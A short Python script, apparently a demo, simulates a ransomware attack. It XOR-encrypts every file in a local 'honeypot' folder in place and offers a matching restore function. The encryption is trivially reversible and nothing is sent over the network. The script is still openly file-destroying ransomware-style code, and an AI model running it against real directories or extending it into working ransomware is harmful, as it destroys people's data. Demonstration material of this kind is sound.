import os
import time

HONEYPOT_FOLDER = "honeypot"

# Simple XOR key (not real encryption, just for demo)
KEY = 123

def xor_encrypt_decrypt(data):
    """Encrypt/Decrypt data using XOR with a key"""
    return bytes([b ^ KEY for b in data])

def attack_honeypot():
    print("💀 Simulating ransomware attack...")

    for root, dirs, files in os.walk(HONEYPOT_FOLDER):
        for file in files:
            path = os.path.join(root, file)

            # Encrypt file
            try:
                with open(path, "rb") as f:
                    content = f.read()
                encrypted = xor_encrypt_decrypt(content)

                # Replace original file with encrypted one
                with open(path, "wb") as f:
                    f.write(encrypted)

                print(f"🔒 Encrypted: {path}")
                time.sleep(1)  # slow down for demo
            except Exception as e:
                print(f"Error encrypting {path}: {e}")

def restore_files():
    print("🔓 Restoring honeypot files...")

    for root, dirs, files in os.walk(HONEYPOT_FOLDER):
        for file in files:
            path = os.path.join(root, file)

            try:
                with open(path, "rb") as f:
                    content = f.read()
                decrypted = xor_encrypt_decrypt(content)

                # Write decrypted content back
                with open(path, "wb") as f:
                    f.write(decrypted)

                print(f"✅ Restored: {path}")
                time.sleep(1)
            except Exception as e:
                print(f"Error restoring {path}: {e}")

if __name__ == "__main__":
    print("Choose an option:")
    print("1. Launch ransomware attack")
    print("2. Restore files")

    choice = input("Enter 1 or 2: ").strip()
    if choice == "1":
        attack_honeypot()
    elif choice == "2":
        restore_files()
    else:
        print("Invalid choice")